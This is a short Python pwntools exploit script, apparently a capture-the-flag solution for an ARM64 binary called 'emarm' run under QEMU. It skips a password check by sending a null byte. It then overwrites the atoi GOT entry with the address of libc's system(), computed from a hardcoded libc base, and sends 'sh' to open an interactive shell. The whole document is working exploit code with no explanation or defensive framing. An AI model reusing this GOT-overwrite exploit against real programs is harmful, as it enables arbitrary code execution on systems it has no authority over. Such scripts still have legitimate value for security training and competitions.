from pwn import *
import sys

context.log_level = 'debug'

binary_name='emarm'
libc_name='libc.so.6'
io =  process(["qemu-aarch64", "-L", ".", "./emarm"])


#p = process(["qemu-aarch64", "-g ","23333","-L", ".", "./emarm"])
libc=ELF("./"+libc_name)
e=ELF("./"+binary_name)



rv = io.recv
ru = io.recvuntil
sd = io.send
sa = io.sendafter
sl = io.sendline
sla = io.sendlineafter
ia = io.interactive

libcbase = 0x400084b000
atoi_got = e.got['atoi']
system = libcbase + libc.sym['system']
print(hex(system))

ru('passwd:')
sl('\x00')
sd(str(atoi_got))
ru('you will success')
sd(p64(system))
sla('you bye','sh\x00')
ia()
	
